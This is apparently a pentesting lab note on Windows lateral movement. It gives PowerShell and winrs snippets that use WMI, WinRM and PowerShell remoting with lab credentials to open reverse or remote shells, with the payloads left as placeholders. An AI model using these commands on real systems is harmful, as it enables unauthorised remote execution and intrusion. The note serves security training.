Windows Management Instrumentation (WMI) is an object-oriented feature that facilitates task automation.

WMI is capable of creating processes via the *Create method* from the *Win32_Process* class. It communicates through **Remote Procedure Calls** (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.

```powershell
# Reverse shell with WMI for Powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'reverse shell command';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

# Reverse shell with winrm
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e reverse_shell"

# Shell access with Powershell remoting
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential -Authentication Negotiate
Enter-PSSession 1
```